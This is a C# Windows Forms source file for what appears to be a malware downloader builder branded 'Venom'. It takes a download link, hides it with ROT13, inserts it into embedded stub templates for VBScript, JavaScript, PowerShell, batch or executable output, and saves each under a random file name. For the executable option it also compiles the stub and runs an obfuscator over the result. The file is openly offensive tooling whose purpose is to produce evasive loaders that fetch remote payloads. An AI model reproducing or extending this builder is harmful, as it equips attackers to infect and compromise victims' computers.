using MetroFramework.Forms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Compiler.build;
namespace downloader
{
    public partial class Downloader : MetroForm
    {
        public Downloader()
        {
            InitializeComponent();
        }

        public static string ROT13(string input)
        {
            char[] inputArray = input.ToCharArray();
            for (int i = 0; i < inputArray.Length; i++)
            {
                if (Char.IsLetter(inputArray[i]))
                {
                    char offset = (Char.IsLower(inputArray[i])) ? 'a' : 'A';
                    inputArray[i] = (char)((inputArray[i] - offset + 13) % 26 + offset);
                }
            }
            return new string(inputArray);
        }

        private void Downloader_Load(object sender, EventArgs e)
        {
            stubs.SelectedIndex = 0;
        }
        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            var result = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }

            return result.ToString();
        }

        private void buildbtn_Click(object sender, EventArgs e)
        {
            String stub = stubs.SelectedItem.ToString();
            String dlink = link.Text;
            if (dlink.Length < 5)
            {
                MessageBox.Show("Link can't be empty !");
                return;
            }
            if (stub == ".vbs")
            {
                String vbspayload = Resource.vbsdownloader;
                vbspayload = vbspayload.Replace("%VENOM_DOWNLOADER%", ROT13(dlink));
                String randomString = GenerateRandomString(10);
                string filename = randomString + ".vbs";
                File.WriteAllText(filename, vbspayload);
                MessageBox.Show("Done!, Saved as " + filename);
            }
            else if (stub == ".js")
            {
                String jspayload = Resource.jsdownloader;
                jspayload = jspayload.Replace("%VENOM_DOWNLOADER%", ROT13(dlink));
                String randomString = GenerateRandomString(10);
                string filename = randomString + ".js";
                File.WriteAllText(filename, jspayload);
                MessageBox.Show("Done!, Saved as " + filename);
            }
            else if (stub == ".ps1")
            {
                String pspayload = Encoding.UTF8.GetString(Resource.powershelldownloader);
                pspayload = pspayload.Replace("%VENOM_DOWNLOADER%", ROT13(dlink));
                String randomString = GenerateRandomString(10);
                string filename = randomString + ".ps1";
                File.WriteAllText(filename, pspayload);
                MessageBox.Show("Done!, Saved as " + filename);
            }
            else if (stub == ".bat")
            {
                String batpayload = Resource.batdownloader;
                batpayload = batpayload.Replace("%VENOM_DOWNLOADER%", ROT13(dlink));
                String randomString = GenerateRandomString(10);
                string filename = randomString + ".bat";
                File.WriteAllText(filename, batpayload);
                MessageBox.Show("Done!, Saved as " + filename);
            }
            else if (stub == ".exe")
            {

                String cspayload = Resource.csharpdownloader;
                cspayload = cspayload.Replace("%VENOM_DOWNLOADER%", ROT13(dlink));
                String randomString = GenerateRandomString(10);
                string filename = randomString + ".exe";
                Builder builder = new Builder
                {
                    StubCs = cspayload,
                    SaveFileName = filename,
                    TempDirectory = Path.Combine(Environment.CurrentDirectory, "temp"),
                };
                Compiler.build.Compiler compiler = new Compiler.build.Compiler();
                string result = compiler.Compile(builder);
                SimpleObfuscator.Obfuscator.Save(File.ReadAllBytes(filename), filename);
                MessageBox.Show("Done!, Saved as " + filename);
            }
        }
    }
}
